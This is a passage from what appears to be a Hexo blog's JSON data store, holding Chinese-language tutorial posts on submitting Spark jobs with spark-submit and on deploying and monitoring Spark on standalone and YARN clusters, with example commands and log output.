OutputCommitCoordinator stopped!</span><br><span class=\"line\">17/10/09 16:25:59 INFO SparkContext: Successfully stopped SparkContext</span><br><span class=\"line\">17/10/09 16:25:59 INFO ShutdownHookManager: Shutdown hook called</span><br><span class=\"line\">17/10/09 16:25:59 INFO ShutdownHookManager: Deleting directory C:\\Users\\hanqian18790\\AppData\\Local\\Temp\\spark-14748c73-2d1d-46b1-82de-5c1328f7fabe</span><br></pre></td></tr></table></figure>\n"},{"title":"3.linux上运行spark程序","date":"2018-07-10T13:09:19.000Z","_content":"[参考官网](http://spark.apache.org/docs/latest/submitting-applications.html)\n\n### spark-submit\n在spark安装目录的bin目录下有一个spark-submit脚本，可以用来提交运行spark程序\n\n如果配置了spark的path可以直接使用spark-submit命令\n\n### 编译构建spark程序\n使用sbt 或者maven构建程序生成jar包\n### spark-submit的使用\n```\nspark-submit \\\n  --class <main-class> \\\n  --master <master-url> \\\n  --deploy-mode <deploy-mode> \\\n  --conf <key>=<value> \\\n  ... # other options\n  <application-jar> \\\n  [application-arguments]\n```\n\n--class: 要运行的jar包里的类，比如 test.spark.examples\n\n--master: master的地址 比如 spark://23.195.26.187:7077\n\n--deploy-mode: 部署模式\n\n--conf: 运行时的一些配置 “key=value”类型 \n\napplication-jar: 要运行的jar包路径，可以是hdfs:// 开头或者 file:// 开头。比如：/root/program/spark/test.jar\n\napplication-arguments: 要传给运行类主方法的参数，没有可以不传\n\n### 例子\n```\n# 本地运行，使用8个核心，传入参数100\n./bin/spark-submit \\\n  --class org.apache.spark.examples.SparkPi \\\n  --master local[8] \\\n  /path/to/examples.jar \\\n  100\n\n# Run on a Spark standalone cluster in client deploy mode\n./bin/spark-submit \\\n  --class org.apache.spark.examples.SparkPi \\\n  --master spark://207.184.161.138:7077 \\\n  --executor-memory 20G \\\n  --total-executor-cores 100 \\\n  /path/to/examples.jar \\\n  1000\n\n# Run on a Spark standalone cluster in cluster deploy mode with supervise\n./bin/spark-submit \\\n  --class org.apache.spark.examples.SparkPi \\\n  --master spark://207.184.161.138:7077 \\\n  --deploy-mode cluster \\\n  --supervise \\\n  --executor-memory 20G \\\n  --total-executor-cores 100 \\\n  /path/to/examples.jar \\\n  1000\n\n# Run on a YARN cluster\nexport HADOOP_CONF_DIR=XXX\n./bin/spark-submit \\\n  --class org.apache.spark.examples.SparkPi \\\n  --master yarn \\\n  --deploy-mode cluster \\  # can be client for client mode\n  --executor-memory 20G \\\n  --num-executors 50 \\\n  /path/to/examples.jar \\\n  1000\n\n# Run a Python application on a Spark standalone cluster\n./bin/spark-submit \\\n  --master spark://207.184.161.138:7077 \\\n  examples/src/main/python/pi.py \\\n  1000\n\n# Run on a Mesos cluster in cluster deploy mode with supervise\n./bin/spark-submit \\\n  --class org.apache.spark.examples.SparkPi \\\n  --master mesos://207.184.161.138:7077 \\\n  --deploy-mode cluster \\\n  --supervise \\\n  --executor-memory 20G \\\n  --total-executor-cores 100 \\\n  http://path/to/examples.jar \\\n  1000\n  \n```\n### 例子：\n程序：\n\n路径：\n\n/root/worspace/test-1.0.jar\n\n命令：\n```\nspark-submit --class SparkSQLExample --master local /root/worspace/test-1.0.jar\n```\n结果：\n\n部分输出如下\n```\n17/10/09 17:58:20 INFO DAGScheduler: ResultStage 9 (show at SparkSQLExample.scala:104) finished in 0.027 s\n17/10/09 17:58:20 INFO DAGScheduler: Job 7 finished: show at SparkSQLExample.scala:104, took 0.044894 s\n+--------------------+----+-------+\n|     _corrupt_record| age|   name|\n+--------------------+----+-------+\n|                null|null|Michael|\n|                null|  30|   Andy|\n|                null|  19| Justin|\n|spark-submit --cl...|null|   null|\n|                 100|null|   null|\n+--------------------+----+-------+\n```","source":"_posts/spark/3.linux上运行spark程序.md","raw":"---\ntitle: 3.linux上运行spark程序\ndate: 2018-07-10 21:09:19\ntags: spark\n---\n[参考官网](http://spark.apache.org/docs/latest/submitting-applications.html)\n\n### spark-submit\n在spark安装目录的bin目录下有一个spark-submit脚本，可以用来提交运行spark程序\n\n如果配置了spark的path可以直接使用spark-submit命令\n\n### 编译构建spark程序\n使用sbt 或者maven构建程序生成jar包\n### spark-submit的使用\n```\nspark-submit \\\n  --class <main-class> \\\n  --master <master-url> \\\n  --deploy-mode <deploy-mode> \\\n  --conf <key>=<value> \\\n  ... # other options\n  <application-jar> \\\n  [application-arguments]\n```\n\n--class: 要运行的jar包里的类，比如 test.spark.examples\n\n--master: master的地址 比如 spark://23.195.26.187:7077\n\n--deploy-mode: 部署模式\n\n--conf: 运行时的一些配置 “key=value”类型 \n\napplication-jar: 要运行的jar包路径，可以是hdfs:// 开头或者 file:// 开头。比如：/root/program/spark/test.jar\n\napplication-arguments: 要传给运行类主方法的参数，没有可以不传\n\n### 例子\n```\n# 本地运行，使用8个核心，传入参数100\n./bin/spark-submit \\\n  --class org.apache.spark.examples.SparkPi \\\n  --master local[8] \\\n  /path/to/examples.jar \\\n  100\n\n# Run on a Spark standalone cluster in client deploy mode\n./bin/spark-submit \\\n  --class org.apache.spark.examples.SparkPi \\\n  --master spark://207.184.161.138:7077 \\\n  --executor-memory 20G \\\n  --total-executor-cores 100 \\\n  /path/to/examples.jar \\\n  1000\n\n# Run on a Spark standalone cluster in cluster deploy mode with supervise\n./bin/spark-submit \\\n  --class org.apache.spark.examples.SparkPi \\\n  --master spark://207.184.161.138:7077 \\\n  --deploy-mode cluster \\\n  --supervise \\\n  --executor-memory 20G \\\n  --total-executor-cores 100 \\\n  /path/to/examples.jar \\\n  1000\n\n# Run on a YARN cluster\nexport HADOOP_CONF_DIR=XXX\n./bin/spark-submit \\\n  --class org.apache.spark.examples.SparkPi \\\n  --master yarn \\\n  --deploy-mode cluster \\  # can be client for client mode\n  --executor-memory 20G \\\n  --num-executors 50 \\\n  /path/to/examples.jar \\\n  1000\n\n# Run a Python application on a Spark standalone cluster\n./bin/spark-submit \\\n  --master spark://207.184.161.138:7077 \\\n  examples/src/main/python/pi.py \\\n  1000\n\n# Run on a Mesos cluster in cluster deploy mode with supervise\n./bin/spark-submit \\\n  --class org.apache.spark.examples.SparkPi \\\n  --master mesos://207.184.161.138:7077 \\\n  --deploy-mode cluster \\\n  --supervise \\\n  --executor-memory 20G \\\n  --total-executor-cores 100 \\\n  http://path/to/examples.jar \\\n  1000\n  \n```\n### 例子：\n程序：\n\n路径：\n\n/root/worspace/test-1.0.jar\n\n命令：\n```\nspark-submit --class SparkSQLExample --master local /root/worspace/test-1.0.jar\n```\n结果：\n\n部分输出如下\n```\n17/10/09 17:58:20 INFO DAGScheduler: ResultStage 9 (show at SparkSQLExample.scala:104) finished in 0.027 s\n17/10/09 17:58:20 INFO DAGScheduler: Job 7 finished: show at SparkSQLExample.scala:104, took 0.044894 s\n+--------------------+----+-------+\n|     _corrupt_record| age|   name|\n+--------------------+----+-------+\n|                null|null|Michael|\n|                null|  30|   Andy|\n|                null|  19| Justin|\n|spark-submit --cl...|null|   null|\n|                 100|null|   null|\n+--------------------+----+-------+\n```","slug":"spark/3.linux上运行spark程序","published":1,"updated":"2018-07-10T13:10:09.982Z","_id":"cjjedmhbv007m0gtjddmuuvg8","comments":1,"layout":"post","photos":[],"link":"","content":"<p><a href=\"http://spark.apache.org/docs/latest/submitting-applications.html\" target=\"_blank\" rel=\"noopener\">参考官网</a></p>\n<h3 id=\"spark-submit\"><a href=\"#spark-submit\" class=\"headerlink\" title=\"spark-submit\"></a>spark-submit</h3><p>在spark安装目录的bin目录下有一个spark-submit脚本，可以用来提交运行spark程序</p>\n<p>如果配置了spark的path可以直接使用spark-submit命令</p>\n<h3 id=\"编译构建spark程序\"><a href=\"#编译构建spark程序\" class=\"headerlink\" title=\"编译构建spark程序\"></a>编译构建spark程序</h3><p>使用sbt 或者maven构建程序生成jar包</p>\n<h3 id=\"spark-submit的使用\"><a href=\"#spark-submit的使用\" class=\"headerlink\" title=\"spark-submit的使用\"></a>spark-submit的使用</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">spark-submit \\</span><br><span class=\"line\">  --class &lt;main-class&gt; \\</span><br><span class=\"line\">  --master &lt;master-url&gt; \\</span><br><span class=\"line\">  --deploy-mode &lt;deploy-mode&gt; \\</span><br><span class=\"line\">  --conf &lt;key&gt;=&lt;value&gt; \\</span><br><span class=\"line\">  ... # other options</span><br><span class=\"line\">  &lt;application-jar&gt; \\</span><br><span class=\"line\">  [application-arguments]</span><br></pre></td></tr></table></figure>\n<p>–class: 要运行的jar包里的类，比如 test.spark.examples</p>\n<p>–master: master的地址 比如 spark://23.195.26.187:7077</p>\n<p>–deploy-mode: 部署模式</p>\n<p>–conf: 运行时的一些配置 “key=value”类型 </p>\n<p>application-jar: 要运行的jar包路径，可以是hdfs:// 开头或者 file:// 开头。比如：/root/program/spark/test.jar</p>\n<p>application-arguments: 要传给运行类主方法的参数，没有可以不传</p>\n<h3 id=\"例子\"><a href=\"#例子\" class=\"headerlink\" title=\"例子\"></a>例子</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 本地运行，使用8个核心，传入参数100</span><br><span class=\"line\">./bin/spark-submit \\</span><br><span class=\"line\">  --class org.apache.spark.examples.SparkPi \\</span><br><span class=\"line\">  --master local[8] \\</span><br><span class=\"line\">  /path/to/examples.jar \\</span><br><span class=\"line\">  100</span><br><span class=\"line\"></span><br><span class=\"line\"># Run on a Spark standalone cluster in client deploy mode</span><br><span class=\"line\">./bin/spark-submit \\</span><br><span class=\"line\">  --class org.apache.spark.examples.SparkPi \\</span><br><span class=\"line\">  --master spark://207.184.161.138:7077 \\</span><br><span class=\"line\">  --executor-memory 20G \\</span><br><span class=\"line\">  --total-executor-cores 100 \\</span><br><span class=\"line\">  /path/to/examples.jar \\</span><br><span class=\"line\">  1000</span><br><span class=\"line\"></span><br><span class=\"line\"># Run on a Spark standalone cluster in cluster deploy mode with supervise</span><br><span class=\"line\">./bin/spark-submit \\</span><br><span class=\"line\">  --class org.apache.spark.examples.SparkPi \\</span><br><span class=\"line\">  --master spark://207.184.161.138:7077 \\</span><br><span class=\"line\">  --deploy-mode cluster \\</span><br><span class=\"line\">  --supervise \\</span><br><span class=\"line\">  --executor-memory 20G \\</span><br><span class=\"line\">  --total-executor-cores 100 \\</span><br><span class=\"line\">  /path/to/examples.jar \\</span><br><span class=\"line\">  1000</span><br><span class=\"line\"></span><br><span class=\"line\"># Run on a YARN cluster</span><br><span class=\"line\">export HADOOP_CONF_DIR=XXX</span><br><span class=\"line\">./bin/spark-submit \\</span><br><span class=\"line\">  --class org.apache.spark.examples.SparkPi \\</span><br><span class=\"line\">  --master yarn \\</span><br><span class=\"line\">  --deploy-mode cluster \\  # can be client for client mode</span><br><span class=\"line\">  --executor-memory 20G \\</span><br><span class=\"line\">  --num-executors 50 \\</span><br><span class=\"line\">  /path/to/examples.jar \\</span><br><span class=\"line\">  1000</span><br><span class=\"line\"></span><br><span class=\"line\"># Run a Python application on a Spark standalone cluster</span><br><span class=\"line\">./bin/spark-submit \\</span><br><span class=\"line\">  --master spark://207.184.161.138:7077 \\</span><br><span class=\"line\">  examples/src/main/python/pi.py \\</span><br><span class=\"line\">  1000</span><br><span class=\"line\"></span><br><span class=\"line\"># Run on a Mesos cluster in cluster deploy mode with supervise</span><br><span class=\"line\">./bin/spark-submit \\</span><br><span class=\"line\">  --class org.apache.spark.examples.SparkPi \\</span><br><span class=\"line\">  --master mesos://207.184.161.138:7077 \\</span><br><span class=\"line\">  --deploy-mode cluster \\</span><br><span class=\"line\">  --supervise \\</span><br><span class=\"line\">  --executor-memory 20G \\</span><br><span class=\"line\">  --total-executor-cores 100 \\</span><br><span class=\"line\">  http://path/to/examples.jar \\</span><br><span class=\"line\">  1000</span><br></pre></td></tr></table></figure>\n<h3 id=\"例子：\"><a href=\"#例子：\" class=\"headerlink\" title=\"例子：\"></a>例子：</h3><p>程序：</p>\n<p>路径：</p>\n<p>/root/worspace/test-1.0.jar</p>\n<p>命令：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">spark-submit --class SparkSQLExample --master local /root/worspace/test-1.0.jar</span><br></pre></td></tr></table></figure></p>\n<p>结果：</p>\n<p>部分输出如下<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">17/10/09 17:58:20 INFO DAGScheduler: ResultStage 9 (show at SparkSQLExample.scala:104) finished in 0.027 s</span><br><span class=\"line\">17/10/09 17:58:20 INFO DAGScheduler: Job 7 finished: show at SparkSQLExample.scala:104, took 0.044894 s</span><br><span class=\"line\">+--------------------+----+-------+</span><br><span class=\"line\">|     _corrupt_record| age|   name|</span><br><span class=\"line\">+--------------------+----+-------+</span><br><span class=\"line\">|                null|null|Michael|</span><br><span class=\"line\">|                null|  30|   Andy|</span><br><span class=\"line\">|                null|  19| Justin|</span><br><span class=\"line\">|spark-submit --cl...|null|   null|</span><br><span class=\"line\">|                 100|null|   null|</span><br><span class=\"line\">+--------------------+----+-------+</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"http://spark.apache.org/docs/latest/submitting-applications.html\" target=\"_blank\" rel=\"noopener\">参考官网</a></p>\n<h3 id=\"spark-submit\"><a href=\"#spark-submit\" class=\"headerlink\" title=\"spark-submit\"></a>spark-submit</h3><p>在spark安装目录的bin目录下有一个spark-submit脚本，可以用来提交运行spark程序</p>\n<p>如果配置了spark的path可以直接使用spark-submit命令</p>\n<h3 id=\"编译构建spark程序\"><a href=\"#编译构建spark程序\" class=\"headerlink\" title=\"编译构建spark程序\"></a>编译构建spark程序</h3><p>使用sbt 或者maven构建程序生成jar包</p>\n<h3 id=\"spark-submit的使用\"><a href=\"#spark-submit的使用\" class=\"headerlink\" title=\"spark-submit的使用\"></a>spark-submit的使用</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">spark-submit \\</span><br><span class=\"line\">  --class &lt;main-class&gt; \\</span><br><span class=\"line\">  --master &lt;master-url&gt; \\</span><br><span class=\"line\">  --deploy-mode &lt;deploy-mode&gt; \\</span><br><span class=\"line\">  --conf &lt;key&gt;=&lt;value&gt; \\</span><br><span class=\"line\">  ... # other options</span><br><span class=\"line\">  &lt;application-jar&gt; \\</span><br><span class=\"line\">  [application-arguments]</span><br></pre></td></tr></table></figure>\n<p>–class: 要运行的jar包里的类，比如 test.spark.examples</p>\n<p>–master: master的地址 比如 spark://23.195.26.187:7077</p>\n<p>–deploy-mode: 部署模式</p>\n<p>–conf: 运行时的一些配置 “key=value”类型 </p>\n<p>application-jar: 要运行的jar包路径，可以是hdfs:// 开头或者 file:// 开头。比如：/root/program/spark/test.jar</p>\n<p>application-arguments: 要传给运行类主方法的参数，没有可以不传</p>\n<h3 id=\"例子\"><a href=\"#例子\" class=\"headerlink\" title=\"例子\"></a>例子</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 本地运行，使用8个核心，传入参数100</span><br><span class=\"line\">./bin/spark-submit \\</span><br><span class=\"line\">  --class org.apache.spark.examples.SparkPi \\</span><br><span class=\"line\">  --master local[8] \\</span><br><span class=\"line\">  /path/to/examples.jar \\</span><br><span class=\"line\">  100</span><br><span class=\"line\"></span><br><span class=\"line\"># Run on a Spark standalone cluster in client deploy mode</span><br><span class=\"line\">./bin/spark-submit \\</span><br><span class=\"line\">  --class org.apache.spark.examples.SparkPi \\</span><br><span class=\"line\">  --master spark://207.184.161.138:7077 \\</span><br><span class=\"line\">  --executor-memory 20G \\</span><br><span class=\"line\">  --total-executor-cores 100 \\</span><br><span class=\"line\">  /path/to/examples.jar \\</span><br><span class=\"line\">  1000</span><br><span class=\"line\"></span><br><span class=\"line\"># Run on a Spark standalone cluster in cluster deploy mode with supervise</span><br><span class=\"line\">./bin/spark-submit \\</span><br><span class=\"line\">  --class org.apache.spark.examples.SparkPi \\</span><br><span class=\"line\">  --master spark://207.184.161.138:7077 \\</span><br><span class=\"line\">  --deploy-mode cluster \\</span><br><span class=\"line\">  --supervise \\</span><br><span class=\"line\">  --executor-memory 20G \\</span><br><span class=\"line\">  --total-executor-cores 100 \\</span><br><span class=\"line\">  /path/to/examples.jar \\</span><br><span class=\"line\">  1000</span><br><span class=\"line\"></span><br><span class=\"line\"># Run on a YARN cluster</span><br><span class=\"line\">export HADOOP_CONF_DIR=XXX</span><br><span class=\"line\">./bin/spark-submit \\</span><br><span class=\"line\">  --class org.apache.spark.examples.SparkPi \\</span><br><span class=\"line\">  --master yarn \\</span><br><span class=\"line\">  --deploy-mode cluster \\  # can be client for client mode</span><br><span class=\"line\">  --executor-memory 20G \\</span><br><span class=\"line\">  --num-executors 50 \\</span><br><span class=\"line\">  /path/to/examples.jar \\</span><br><span class=\"line\">  1000</span><br><span class=\"line\"></span><br><span class=\"line\"># Run a Python application on a Spark standalone cluster</span><br><span class=\"line\">./bin/spark-submit \\</span><br><span class=\"line\">  --master spark://207.184.161.138:7077 \\</span><br><span class=\"line\">  examples/src/main/python/pi.py \\</span><br><span class=\"line\">  1000</span><br><span class=\"line\"></span><br><span class=\"line\"># Run on a Mesos cluster in cluster deploy mode with supervise</span><br><span class=\"line\">./bin/spark-submit \\</span><br><span class=\"line\">  --class org.apache.spark.examples.SparkPi \\</span><br><span class=\"line\">  --master mesos://207.184.161.138:7077 \\</span><br><span class=\"line\">  --deploy-mode cluster \\</span><br><span class=\"line\">  --supervise \\</span><br><span class=\"line\">  --executor-memory 20G \\</span><br><span class=\"line\">  --total-executor-cores 100 \\</span><br><span class=\"line\">  http://path/to/examples.jar \\</span><br><span class=\"line\">  1000</span><br></pre></td></tr></table></figure>\n<h3 id=\"例子：\"><a href=\"#例子：\" class=\"headerlink\" title=\"例子：\"></a>例子：</h3><p>程序：</p>\n<p>路径：</p>\n<p>/root/worspace/test-1.0.jar</p>\n<p>命令：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">spark-submit --class SparkSQLExample --master local /root/worspace/test-1.0.jar</span><br></pre></td></tr></table></figure></p>\n<p>结果：</p>\n<p>部分输出如下<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">17/10/09 17:58:20 INFO DAGScheduler: ResultStage 9 (show at SparkSQLExample.scala:104) finished in 0.027 s</span><br><span class=\"line\">17/10/09 17:58:20 INFO DAGScheduler: Job 7 finished: show at SparkSQLExample.scala:104, took 0.044894 s</span><br><span class=\"line\">+--------------------+----+-------+</span><br><span class=\"line\">|     _corrupt_record| age|   name|</span><br><span class=\"line\">+--------------------+----+-------+</span><br><span class=\"line\">|                null|null|Michael|</span><br><span class=\"line\">|                null|  30|   Andy|</span><br><span class=\"line\">|                null|  19| Justin|</span><br><span class=\"line\">|spark-submit --cl...|null|   null|</span><br><span class=\"line\">|                 100|null|   null|</span><br><span class=\"line\">+--------------------+----+-------+</span><br></pre></td></tr></table></figure></p>\n"},{"title":"6.sparkRDDS","date":"2018-07-10T13:09:19.000Z","_content":"","source":"_posts/spark/6.sparkRDDS.md","raw":"---\ntitle: 6.sparkRDDS\ndate: 2018-07-10 21:09:19\ntags: spark\n---\n","slug":"spark/6.sparkRDDS","published":1,"updated":"2018-07-10T13:10:09.986Z","_id":"cjjedmhbx007p0gtjl3d97a55","comments":1,"layout":"post","photos":[],"link":"","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"5.spark程序提交集群和监控","date":"2018-07-10T13:09:19.000Z","_content":"### 运行模式\nSpark 应用在集群上作为独立的进程组来运行，在 main 程序中通过 SparkContext 来协调（称之为 driver 程序）  \n\n![image](http://spark.apache.org/docs/latest/img/cluster-overview.png)\n\n1.每个应用获取到它自己的 Executor 进程，它们会保持在整个应用的生命周期中并且在多个线程中运行 Task（任务）。这样做的优点是把应用互相隔离，在调度方面（每个 driver 调度它自己的 task）和 Executor 方面（来自不同应用的 task 运行在不同的 JVM 中）。然而，这也意味着若是不把数据写到外部的存储系统中的话，数据就不能够被不同的 Spark 应用（SparkContext 的实例）之间共享。\n\n2.Spark 是不知道底层的 Cluster Manager 到底是什么类型的。只要它能够获得 Executor 进程，并且它们可以和彼此之间通信，那么即使是在一个也支持其它应用的 Cluster Manager（例如，Mesos / YARN）上来运行它也是相对简单的。\n\n3.Driver 程序必须在自己的生命周期内（例如，请看 在网络中配置 spark.driver.port 章节）监听和接受来自它的 Executor 的连接请求。同样的，driver 程序必须可以从 worker 节点上网络寻址（就是网络没问题）。\n\n4.因为 driver 调度了集群上的 task（任务），更好的方式应该是在相同的局域网中靠近 worker 的节点上运行。如果您不喜欢发送请求到远程的集群，倒不如打开一个 RPC 至 driver 并让它就近提交操作而不是从很远的 worker 节点上运行一个 driver。\n### 集群类型\n1.Standalone – 包含在 Spark 中使得它更容易来安装集群的一个简单的 Cluster Manager。\n\n2.Mesos – 一个通用的 Cluster Manager，它也可以运行 Hadoop MapReduce 和其它服务应用。\n\n3.Hadoop YARN – Hadoop 2 中的 resource manager（资源管理器）。\n\n### Standalone\n#### 部署\n启动集群：\n\nspark根目录下\n\n    ./sbin/start-master.sh\n    \n启动之后可以在ip:8080上访问集群信息\n\n运行程序\nspark submit命令可以启动程序\n\n    spark-submit --class SparkSQLExample --master spark://ip:port /root/worspace/test-1.0.jar\n#### 监控\nSpark 的独立模式提供了一个基于 Web 的用户界面来监控集群。Master 和 每个 Worker 都有自己的 web 用户界面，显示集群和作业统计信息。默认情况下你可以在 8080 端口访问 Web UI 的主端口也可以在配置文件中或通过命令行选项进行更改。\n\n在程序运行的时候可以在ip:4040监控运行状态\n\n### Hadoop YARN \n\n#### 部署\n\n配置HADOOP_CONF_DIR\n```\nvim /etc/profile \n#添加\nHADOOP_CONF_DIR=$HADOOP_HOME/etc/hadoop  \ncd $SPARK_HOME/conf\nvim spark-env.sh \n#添加\nHADOOP_CONF_DIR=$HADOOP_CONF_DIR\n#启动hadoop\ncd $HADOOP_HOME/sbin  \n./start-all.sh\n#新建日志目录\nmkdir /root/logs\n#启动历史信息记录服务\ncd $SPARK_HOME/sbin\n./sbin/start-history-server.sh /root/logs\n#启动应用\n./bin/spark-submit --class SparkSQLExample --master yarn --deploy-mode cluster  /root/worspace/test-1.0.jar\n#如果有参数，参数放在最后\n```\n#### 监控\n配置日志目录\n```\ncd $SPARK_HIME/conf\nvim spark-defaults.conf\n#添加\nspark.eventLog.enabled           true\n spark.eventLog.dir               /root/logs/spark\n spark.history.fs.logDirectory    /root/logs/spark\n```\n日志目录可以是本地目录也可以hdfs目录\n\n监控地址\n运行时：\n\nip:4040(spark)\n\nip:8088（hadoop）\n\nip:18080(spark历史)","source":"_posts/spark/5.spark程序提交集群和监控.md","raw":"---\ntitle: 5.spark程序提交集群和监控\ndate: 2018-07-10 21:09:19\ntags: spark\n---\n### 运行模式\nSpark 应用在集群上作为独立的进程组来运行，在 main 程序中通过 SparkContext 来协调（称之为 driver 程序）  \n\n![image](http://spark.apache.org/docs/latest/img/cluster-overview.png)\n\n1.每个应用获取到它自己的 Executor 进程，它们会保持在整个应用的生命周期中并且在多个线程中运行 Task（任务）。这样做的优点是把应用互相隔离，在调度方面（每个 driver 调度它自己的 task）和 Executor 方面（来自不同应用的 task 运行在不同的 JVM 中）。然而，这也意味着若是不把数据写到外部的存储系统中的话，数据就不能够被不同的 Spark 应用（SparkContext 的实例）之间共享。\n\n2.Spark 是不知道底层的 Cluster Manager 到底是什么类型的。只要它能够获得 Executor 进程，并且它们可以和彼此之间通信，那么即使是在一个也支持其它应用的 Cluster Manager（例如，Mesos / YARN）上来运行它也是相对简单的。\n\n3.Driver 程序必须在自己的生命周期内（例如，请看 在网络中配置 spark.driver.port 章节）监听和接受来自它的 Executor 的连接请求。同样的，driver 程序必须可以从 worker 节点上网络寻址（就是网络没问题）。\n\n4.因为 driver 调度了集群上的 task（任务），更好的方式应该是在相同的局域网中靠近 worker 的节点上运行。如果您不喜欢发送请求到远程的集群，倒不如打开一个 RPC 至 driver 并让它就近提交操作而不是从很远的 worker 节点上运行一个 driver。\n### 集群类型\n1.Standalone – 包含在 Spark 中使得它更容易来安装集群的一个简单的 Cluster Manager。\n\n2.Mesos – 一个通用的 Cluster Manager，它也可以运行 Hadoop MapReduce 和其它服务应用。\n\n3.Hadoop YARN – Hadoop 2 中的 resource manager（资源管理器）。\n\n### Standalone\n#### 部署\n启动集群：\n\nspark根目录下\n\n    ./sbin/start-master.sh\n    \n启动之后可以在ip:8080上访问集群信息\n\n运行程序\nspark submit命令可以启动程序\n\n    spark-submit --class SparkSQLExample --master spark://ip:port /root/worspace/test-1.0.jar\n#### 监控\nSpark 的独立模式提供了一个基于 Web 的用户界面来监控集群。Master 和 每个 Worker 都有自己的 web 用户界面，显示集群和作业统计信息。默认情况下你可以在 8080 端口访问 Web UI 的主端口也可以在配置文件中或通过命令行选项进行更改。\n\n在程序运行的时候可以在ip:4040监控运行状态\n\n### Hadoop YARN \n\n#### 部署\n\n配置HADOOP_CONF_DIR\n```\nvim /etc/profile \n#添加\nHADOOP_CONF_DIR=$HADOOP_HOME/etc/hadoop  \ncd $SPARK_HOME/conf\nvim spark-env.sh \n#添加\nHADOOP_CONF_DIR=$HADOOP_CONF_DIR\n#启动hadoop\ncd $HADOOP_HOME/sbin  \n./start-all.sh\n#新建日志目录\nmkdir 